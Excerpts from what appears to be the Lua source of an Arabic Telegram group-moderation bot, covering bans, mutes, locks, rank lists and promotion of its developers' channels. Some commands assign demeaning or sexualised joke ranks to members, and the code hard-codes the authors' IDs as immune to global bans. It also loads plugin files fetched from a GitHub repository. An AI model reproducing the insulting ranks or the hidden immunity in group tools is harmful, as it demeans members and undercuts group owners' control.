https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/abdoelasill&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'المبرمج كريم' or text == 'كككريم' or text == 'كركر' or text == '³مبرمج السورس' then
local Text = [[
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '• ᴅᴇᴠ KAREM',url="t.me/KarimArbyy"}},
{{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
if text == 'المبرمج شادو' or text == 'شادو' or text == 'شادوا' or text == '⁴مبرمج السورس' or text == 'سكران' or text == '34' then
local Text = [[
شادو مبرمج السورس⁴ لو حابب تتواصل معاه
اتبع الزر إلى تحت ⇈⇊
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '• ᴅᴇᴠ SHADWA ',url="t.me/KB_Shadow"}},
{{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
if text == 'Saidi' or text == 'Source Saidi' or text == 'قناة البرمجه' or text == 'قناة سورس فاستر' then
local Text = [[
من أحسن السورسات على التليجرام سورس فاستر
 بجد سورس أمان جدا وفي مميزات جامده
تع نصب بوتك عندنا لو محظور
...
local Text = [[
مطورين ومبرمجين سورس فاستر اتبع الازرار للتواصل معهم ⇈⇊
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'جـابــوا مـبــرمـج السـورس',url="t.me/s_e_z_r0"}},
{{text = 'طـه مـبــرمـج السـورس',url="t.me/YtIIIl"}},
{{text = 'عمـر مـبــرمـج السـورس',url="t.me/KarimArbyy"}},
{{text = 'ابــو المـجـد مـبــرمـج السـورس',url="t.me/KB_Shadow"}},
{{text = '`sᴏᴜʀᴄᴇ sᴀɪᴅɪ´', url="t.me/FA9SH"}},
{{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
"ينفع احضنك؟ ", 
"قولي ع اكبر غلاصيل ندمان عليهاا؟ ", 
"عندك كام سنه؟ ", 
...
"وش نوع الأفلام اللي تحب تتابعه؟ ",
  ...
  "وش الإسم اللي دايم تحاصيل بالبرامج؟ ",
  "وش برجك؟ ",
...
"مرة واحد غبي معاه عربية قديمة جدًا وبيحاول يبيعها وماحدش راضي يشتريها.. راح لصاحبه حكاله المشكلة.. صاحبه قاله عندي لك فكرة جهنمية هاتخليها تتباع الصبح.. أنت تجيب علامة مرسيدس وتحاصيلا عليها. بعد أسبوعين صاحبه شافه صدفة قاله بعت العربية ولا لاء؟ قاله انت  مجنون؟ حد يبيع مرسيدس؟ 🤓😂",
...
local iduser = userid 
send(msg.chat_id_, msg.id_,'  𖤗 الايدي ⇇↝'..iduser..'↜\n 𖤗 المعرف ⇇↝'..username..'↜\n 𖤗 الرتبه ⇇↝'..rtp..'↜\n 𖤗 نوع الكشف ⇇بالمعرف \n 𖤗 سعر الكشف 50جنيه 😹') 
end,nil) 
else 
send(msg.chat_id_, msg.id_,'  𖤗 المعرف غير صحيح') 
end 
end 
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil) 
end
if text == 'فاستر' or text == 'سورس مين ده' then
local Text = [[ 
من أحسن السورسات على التليجرام سورس فاستر
حمايه↤سرعه↤دقه↤وامان
 قناه السورس ⇈⇊
[`ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ѕᴏ𝗎ʀᴄᴇ ѕᴀɪᴅᴀ´](http://t.me/FA9SH)
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '`sᴏᴜʀᴄᴇ sᴀɪᴅɪ´', url="t.me/FA9SH"}}, 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/FA9SH/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'العاب' then
local Text = [[ 
✇مرحبا اليك العاب سورس فاستر الافضل✇
 ]]  
keyboard = {}   
keyboard.inline_keyboard = {  
...
send(msg.chat_id_, msg.id_, '\n 𖤗 عذرا لا تستطيع حظر ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
end
...
send(msg.chat_id_, msg.id_,' 𖤗 تم ازالة جميع الاوامر المضافه')  
end
end
...
send(msg.chat_id_, msg.id_,' 𖤗 ارسل الامر القديم')  
return false
end
...
send(msg.chat_id_, msg.id_,' 𖤗 ارسل الامر الذي قمت بوضعه بدلا عن القديم')  
return false
end
end
if text and database:get(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_) == 'true' then
database:set(bot_id.."Set:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,' 𖤗 ارسل الامر الجديد')  
...
send(msg.chat_id_, msg.id_,' 𖤗 تم حفظ الامر')  
...
send(msg.chat_id_, msg.id_, ' 𖤗 مـن قبـل  ⇇ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n⦁ تم تفعيل التنظيف التلقائي* ')
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖤗 تم تعطيل جلب الصوره ،\n 𖤗 تم قفل البوتات  ،\n 𖤗 تم قفل التكرار ،\n 𖤗 تم قفل الروابط ،\n 𖤗 تم قفل التوجيه ،\n 𖤗 تم قفل الملصقات ،\n 𖤗 تم قفل المتحركه ،\n 𖤗 تم قفل الفيديو ،\n 𖤗 تم قفل الفشار ،\n 𖤗 تم قفل الانلاين ،\n 𖤗 تم قفل تعديل المديا ،\n 𖤗 تم وضع التكرار  ،\n 𖤗 تم قفل الفارسيه  ،\n 𖤗 تم وضع الايدي بدون صوره ،n  \n 𖤗 تم تفعيل الحمايه  بواساصيل ، [↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜](T.ME/'..(data.username_ or 'textchuser')..')  ')
end,nil)   
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖤗 تم تفعيل جلب الصوره ،\n 𖤗 تم  فتح البوتات  ،\n 𖤗 تم  فتح التكرار ،\n 𖤗 تم  فتح الروابط ،\n 𖤗 تم  فتح التوجيه ،\n 𖤗 تم  فتح الملصقات ،\n 𖤗 تم  فتح المتحركه ،\n 𖤗 تم  فتح الفيديو ،\n 𖤗 تم  فتح الفشار ،\n 𖤗 تم  فتح الانلاين ،\n 𖤗 تم  فتح تعديل المديا ،\n 𖤗 تم وضع التكرار  ،\n 𖤗 تم  فتح الفارسيه  ،\n 𖤗 تم وضع الايدي بصوره،n \n 𖤗 تم تفعيل الحمايه  بواساصيل ، [↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜](T.ME/'..(data.username_ or 'textchuser')..')  ')
end,nil)   
end
...
Text = ' 𖤗 تم تفعيل امر غنيلي الان ارسل غنيلي'
database:del(bot_id..'sing:for:me'..msg.chat_id_)  
else
Text = ' 𖤗 بالتاكيد تم تفعيل امر غنيلي تستطيع ارسال غنيلي'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n 𖤗 تم تعطيل نسبه الانوثه'
else
Text = '\n 𖤗 بالتاكيد تم تعطيل نسبه الانوثه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل all' and CoSu(msg) then   
if database:get(bot_id..'Cick:all'..msg.chat_id_) then
Text = ' 𖤗 تم تفعيل امر @all'
database:del(bot_id..'Cick:all'..msg.chat_id_)  
else
Text = ' 𖤗 بالتاكيد تم تفعيل امر @all'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖤗  مـن قبـل  ⇇[↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜](T.ME/'..(data.username_ or 'textchuser')..') \n 𖤗 تـم قفـل التاك بالتقييد ')
end,nil)   
elseif text == 'قفل التاك بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖤗  مـن قبـل  ⇇['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'textchuser')..') \n 𖤗 تـم قفـل التاك بالكتم ')
end,nil)   
elseif text == 'قفل التاك بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖤗  مـن قبـل  ⇇[↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜](T.ME/'..(data.username_ or 'textchuser')..') \n 𖤗 تـم قفـل التاك بالطرد ')
end,nil)   
...
send(msg.chat_id_, msg.id_, " 𖤗 لا يمكنك حظر المطور الاساسي \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖤗 لا تسطيع حظر البوت عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1819632524) then  
send(msg.chat_id_, msg.id_, " 𖤗 لا تسطيع الواد عمر عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1804119251) then  
send(msg.chat_id_, msg.id_, " 𖤗 لا تسطيع حظر عمك سيزر عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(2068516411) then  
send(msg.chat_id_, msg.id_, "  𖤗 لا تسطيع حظر الواد شادو عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1825532106) then  
send(msg.chat_id_, msg.id_, " 𖤗 لا تسطيع حظر الواد اصيل عام")
return false 
end
...
function(arg,data) 
usertext = '\n 𖤗 العضو ⤌ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖤗 تم حظرو عام من الجروبات '
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
...
usertext = '\n 𖤗 العضو ⤌ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖤗 تم حظرو عام من الجروبات '
texts = usertext..status
...
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " 𖤗 لا يمكنك كتم المطور الاساسي \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖤗 لا تسطيع كتم البوت عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1804119251) then  
send(msg.chat_id_, msg.id_, " 𖤗 لا تسطيع كتم عمك سيزر عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(2068516411) then  
send(msg.chat_id_, msg.id_, " 𖤗 لا تسطيع كتم الواد شادو عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1825532106) then  
send(msg.chat_id_, msg.id_, " 𖤗 لا تسطيع كتم الواد اصيل عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1819632524) then  
send(msg.chat_id_, msg.id_, " 𖤗 لا تسطيع الواد عمر عام")
...
usertext = '\n 𖤗 العضو ⤌ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖤗 تم الغاء (الحظر-الكتم) عام من {'..Groups..'} مجموعه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
...
usertext = '\n 𖤗 العضو ⤌ '..userid..''
status  = '\n 𖤗 تم حظره عام من {'..Groups..'} مجموعه'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
...
send(msg.chat_id_, msg.id_, "\n 𖤗 تم مسح قائمة المطورين  ")
end
if text == ("المطورين") and DevSoFi(msg) then
local list = database:smembers(bot_id..'Sudo:User')
t = "\n 𖤗  قائمة مطورين البوت \n◤━━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━─◥\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
...
if Get_info then
local TextS = "\n 𖤗 اهلا بك في متجر ملفات فاستر\n 𖤗 ملفات السورس ◤━───━❲𝐒𝐀𝐃❳━───━◥\n◤━───━❲𝐒𝐀𝐃❳━───━◥\n\n"
local TextE = "\n◤━───━❲𝐒𝐀𝐃❳━───━◥\n 𖤗 علامة تعني { ✔️ } ملف مفعل\n 𖤗 علامة تعني { ✖ } ملف معطل\n 𖤗 قناة سورس فاستر◤━───━❲𝐒𝐀𝐃❳━───━◥\n".." 𖤗 [اضغط هنا لدخول](t.me/FA9SH) \n"
local NumFile = 0
...
send(msg.chat_id_, msg.id_," 𖤗 لا يوجد اتصال من ال api \n") 
end
return false
end
end
...
t = " 𖤗 بالتاكيد تم تعطيل ملف → "..file.."\n"
end
...
send(msg.chat_id_, msg.id_," 𖤗 عذرا الملف لايدعم سورس فاستر\n") 
end
return false
end
...
if file_bot then
io.close(file_bot)
t = " 𖤗 بالتاكيد تم تفعيل ملف → "..file.." \n"
else
t = " 𖤗 الملف  ⇇"..file.."\n 𖤗 تم تفعيل ملف \n"
end
local json_file, res = https.request("https://raw.githubusercontent.com/JABWA/Saidi/main/File_Bot/"..file)
...
send(msg.chat_id_,msg.id_," 𖤗 تم مسح الملفات")
return false
end
...
send(msg.chat_id_, msg.id_,' 𖤗 لا ����ستطيع استخدام البوت \n ??  يرجى الاشتراك بالقناه اولا \n 𖤗  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
...
if #list == 0 then
t = " 𖤗 لا يوجد احد في قائمه فاستر"
end
send(msg.chat_id_, msg.id_, t)
return false
end
...
if #list == 0 then
t = " 𖤗 لا يوجد احد في قائمه المالك"
end
send(msg.chat_id_, msg.id_, t)
end
...
t = " 𖤗 المنشئين الاساسين تعالو مخرب \n◤━━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━─◥\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
...
if #list == 0 then
t = " 𖤗 ماكو منششئين يشوفولك جاره"
end
Reply_Status(msg,msg.sender_user_id_,"reply"," 𖤗 قام بنشر ملصق اباحيه\n"..t)  
...
Reply_Status(msg,msg.sender_user_id_,"reply"," 𖤗 قام بنشر صوره اباحيه\n"..t)  
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
end   
end
...
Text = ' 𖤗 بالتاكيد تم تفعيل امر تحويل'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n 𖤗 تم تعطيل امر تحويل'
else
Text = '\n 𖤗 بالتاكيد تم تعطيل امر تحويل'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
send(msg.chat_id_, msg.id_, '\n 𖤗 تم مسح المنشئين الاساسين')
return false
end
if text == 'المنشئين الاساسين' and CoSu(msg) then
local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
t = "\n 𖤗 قائمة المنشئين الاساسين \n◤━━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━─◥\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
...
if b.first_name_ == false then
send(msg.chat_id_, msg.id_," 𖤗 حساب المنشئ محذوف")
return false  
end
if b.username_ then
...
local Text = " 𖤗 منشئ الجروب  ⇇ ["..b.first_name_.."](tg://user?id="..b.id_..")\n"..getbio(b.id_):gsub('لايوجد','')
local msg_id = msg.id_/2097152/0.5
keyboard = {} 
keyboard.inline_keyboard = {
...
sendText(b.id_," 𖤗 مرحبا عزيزي المنشئ هناك شخص يريدك \n 𖤗 الشخص  {"..Name.."}\n 𖤗 اسم الجروب {"..NameChat.."}\n 𖤗 ايدي الجروب {"..msg.chat_id_.."}\n 𖤗 رابط الجروب \n ["..LinkGroup.."] ",0,'md')
end,nil)
end,nil)
end,nil)
end
...
Reply_Status(msg,result.sender_user_id_,"reply"," 𖤗 تم ترقيته مطور ثانوي في البوت")  
end
...
Reply_Status(msg,result.id_,"reply"," 𖤗 تم ترقيته مطور ثانوي في البوت")  
else
send(msg.chat_id_, msg.id_," 𖤗 لا يوجد حساب بهاذا المعرف")
end
end
...
Reply_Status(msg,userid,"reply"," 𖤗 تم ترقيته مطور ثانوي في البوت")  
return false 
end
...
Reply_Status(msg,result.sender_user_id_,"reply"," 𖤗 تم تنزيله من المطور ثانويين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DRAGON, nil)
return false 
end
...
Reply_Status(msg,result.id_,"reply"," 𖤗 تم تنزيله من المطور ثانويين")  
else
send(msg.chat_id_, msg.id_," 𖤗 لا يوجد حساب بهاذا المعرف")
end
end
...
Reply_Status(msg,userid,"reply"," 𖤗 تم تنزيله من المطور ثانويين")  
return false 
end
if text == ("الثانوين") and SudoBot(msg) then
local list = database:smembers(bot_id.."Dev:SoFi:2")
...
send(msg.chat_id_, msg.id_, "\n 𖤗 تم مسح قائمة المطورين الثانوين  ")
end
------------------------------------------------------------------------
...
if num2 == 0 then
send(msg.chat_id_, msg.id_," 𖤗 لا يوجد ادمنيه ليتم رفعهم") 
else
send(msg.chat_id_, msg.id_," 𖤗 تمت ترقيه { "..num2.." } من الادمنيه") 
end
end,nil)   
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم مسح الادمنيه')
end
...
send(msg.chat_id_, msg.id_,' 𖤗 تم تعطيل الرفع') 
return false
end
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم مسح المنظفين')
end
...
send(msg.chat_id_, msg.id_,' 𖤗 تم تعطيل الطرد') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖤗 لا تسطيع طرد البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 𖤗 عذرا لا تستطيع طرد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' 𖤗  ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 𖤗 البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
...
send(msg.chat_id_, msg.id_, '\n 𖤗 عذرا لا تستطيع طرد ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠| عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
...
send(msg.chat_id_, msg.id_, '\n 𖤗 عذرا لا تستطيع طرد ( '..Rutba(userid,msg.chat_id_)..' )')
else
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم مسح المميزين')
end
if text == ("المميزين") and Mod(msg) then
local list = database:smembers(bot_id..'Special:User'..msg.chat_id_)
t = "\n 𖤗 قائمة مميزين الجروب \n◤━───━❲𝐒𝐀𝐃❳━───━◥\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖤗 لعضو  ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖤗 تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖤗 الـعـضو   ⇇'..userid..''
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم مسح جميع المتوحدين')
end
if text == ("تاك للمتوحدين") and Mod(msg) then
local list = database:smembers(bot_id..'Mote:User'..msg.chat_id_)
t = "\n 𖤗 قائمة متوحدين الجروب \n◤━───━❲𝐒𝐀𝐃❳━───━◥\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n 𖤗 تم رفع الـعـضو  متوحد في الجروب \n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖤗 تم تنزيل الـعـضو  متوحد في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم مسح جميع الزوجات')
end
if text == ("تاك للزوجات") and Mod(msg) then
local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
t = "\n 𖤗 قائمه زوجات الجروب \n◤━───━❲𝐒𝐀𝐃❳━───━◥\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗 العضــو  ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n 𖤗 تم رفع العضــو زوجه في الجروب \n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗 العضــو  ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖤗 تم تنزيل العضــو الزوجات من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم مسح جميع الكلاب')
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗 العضــو  ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n 𖤗 تم رفع العضــو كلب في الجروب \n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗 العضــو  ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖤗 تم تنزيل العضــو كلب من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم تنزيل جميع حمير من الجروب')
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n 𖤗 تم رفع المتهم حمار بالجروب\n 𖤗 الان اصبح حمار الجروب'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم تنزيل جميع وتكات الجروب')
end
if text == ("تاك للوتكات") and Mod(msg) then
local list = database:smembers(bot_id..'Motte:User'..msg.chat_id_)
t = "\n 𖤗 قائمة وتكات الجروب \n◤━───━❲𝐒𝐀𝐃❳━───━◥\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم تنزيل جميع القرده بالجروب')
end
if text == ("تاك للقرود") and Mod(msg) then
local list = database:smembers(bot_id..'Motee:User'..msg.chat_id_)
t = "\n 𖤗 قائمة القرود الجروب \n◤━───━❲𝐒𝐀𝐃❳━───━◥\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n 𖤗 تم رفع قرد في الجروب\n 𖤗 تعال حبي استلم موزه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم تنزيل جميع الارامل بالجروب')
end
...
if #list == 0 then
t = " 𖤗 لا يوجد مايا خليفه في هذا الجروب البائس"
end
send(msg.chat_id_, msg.id_, t)
end
---------
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖤗 تم تنزيل مايا خليفه من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم تنزيل جميع البقرات بالجروب')
end
if text == ("تاك للبقرات") and Mod(msg) then
local list = database:smembers(bot_id..'Bakra:User'..msg.chat_id_)
t = "\n 𖤗 قائمة البقرات الجروب \n◤━───━❲𝐒𝐀𝐃❳━───━◥\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n 𖤗 تم رفع بقره في الجروب\n 𖤗 ها يالهايشه تع احلبك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم تنزيل جميع المزز بالجروب')
end
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم تنزيل جميع االاكساس')
end
...
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖤗 تم تنزيل جميع القلوب ')
end
if text == ("تاك لقلبي") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n 𖤗 قائمة القلوب في الجروب\n◤━───━❲𝐒𝐀𝐃❳━───━◥\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."⤌ قلبي [@"..username.."]\n"
...
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖤗 تم تنزيل جميع أولادي')
end
...
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖤗 تم تنزيل جميع زواحف')
end
if text == ("تاك للرقاصات") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n 𖤗 قائمة رقاصات الجروب \n◤━───━❲𝐒𝐀𝐃❳━───━◥\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
